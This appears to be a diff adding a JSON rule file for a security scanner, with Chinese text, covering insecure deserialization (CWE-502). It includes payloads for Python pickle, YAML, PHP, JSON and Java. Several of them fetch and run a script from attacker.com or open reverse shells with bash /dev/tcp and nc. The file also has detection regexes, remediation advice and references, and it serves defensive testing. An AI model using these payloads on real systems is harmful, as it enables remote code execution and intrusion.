@@ -1,0 +1,73 @@
+{
+    "deserialization": {
+        "name": "不安全的反序列化",
+        "cwe_id": "CWE-502",
+        "cvss_base_score": 9.8,
+        "description": "反序列化不可信数据可能导致远程代码执行",
+        "impact": "远程代码执行、拒绝服务、权限提升、认证绕过",
+        "payloads": {
+            "python_pickle": [
+                "cos\nsystem\n(S'id'\ntR.",
+                "cos\nsystem\n(S'curl http://attacker.com/shell.sh | bash'\ntR.",
+                "csubprocess\nPopen\n((S'bash'\nS'-c'\nS'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\nltR.",
+                "cos\nsystem\n(S'nc -e /bin/sh attacker.com 4444'\ntR."
+            ],
+            "python_pickle_base64": [
+                "Y29zCnN5c3RlbQooUydpZCcKdFIu",
+                "Y29zCnN5c3RlbQooUydjdXJsIGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggfCBiYXNoJwp0Ui4="
+            ],
+            "java": [
+                "org.apache.commons.collections.functors.InvokerTransformer",
+                "com.sun.rowset.JdbcRowSetImpl",
+                "javax.management.BadAttributeValueExpException",
+                "java.util.PriorityQueue"
+            ],
+            "php": [
+                "O:8:\"stdClass\":1:{s:4:\"test\";s:10:\"phpinfo()\";}",
+                "O:8:\"stdClass\":2:{s:4:\"test\";O:8:\"stdClass\":1:{s:4:\"test\";s:10:\"phpinfo()\";}}",
+                "O:6:\"Object\":1:{s:4:\"code\";s:17:\"system('whoami');\";}"
+            ],
+            "yaml": [
+                "!!python/object/apply:os.system [id]",
+                "!!python/object/apply:subprocess.Popen [[curl, http://attacker.com/shell.sh, |, bash]]",
+                "!!python/object/new:subprocess.Popen [[bash, -c, bash -i >& /dev/tcp/attacker.com/4444 0>&1]]",
+                "!!python/object/apply:os.system [nc -e /bin/sh attacker.com 4444]"
+            ],
+            "json": [
+                "{\"__class__\":{\"__module__\":\"os\",\"__name__\":\"system\"},\"__args__\":[\"id\"],\"__state__\":{}}"
+            ]
+        },
+        "detection_patterns": [
+            "pickle\\.loads\\s*\\(.*request\\..*\\)",
+            "pickle\\.loads\\s*\\(.*\\+.*\\)",
+            "pickle\\.load\\s*\\(.*request\\..*\\)",
+            "yaml\\.load\\s*\\(.*Loader\\s*=\\s*yaml\\.Loader.*\\)",
+            "yaml\\.load\\s*\\(.*Loader\\s*=\\s*yaml\\.FullLoader.*\\)",
+            "yaml\\.unsafe_load\\s*\\(.*\\)",
+            "marshal\\.loads\\s*\\(.*request\\..*\\)",
+            "unserialize\\s*\\(.*\\$_.*\\)",
+            "ObjectInputStream\\.readObject\\s*\\(.*\\)",
+            "XMLDecoder\\.readObject\\s*\\(.*\\)"
+        ],
+        "safe_patterns": [
+            "pickle\\.loads\\s*\\(.*trusted.*\\)",
+            "yaml\\.safe_load\\s*\\(.*\\)",
+            "json\\.loads\\s*\\(.*\\)",
+            "JSON\\.parse\\s*\\(.*\\)"
+        ],
+        "remediation": [
+            "避免反序列化不可信数据",
+            "使用JSON等安全的数据格式",
+            "对序列化数据进行签名验证",
+            "使用安全的反序列化方法如yaml.safe_load",
+            "实施严格的类型检查",
+            "使用反序列化过滤器(如Java的SerialKiller)",
+            "限制反序列化的类白名单"
+        ],
+        "references": [
+            "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
+            "https://cwe.mitre.org/data/definitions/502.html",
+            "https://portswigger.net/web-security/deserialization"
+        ]
+    }
+}
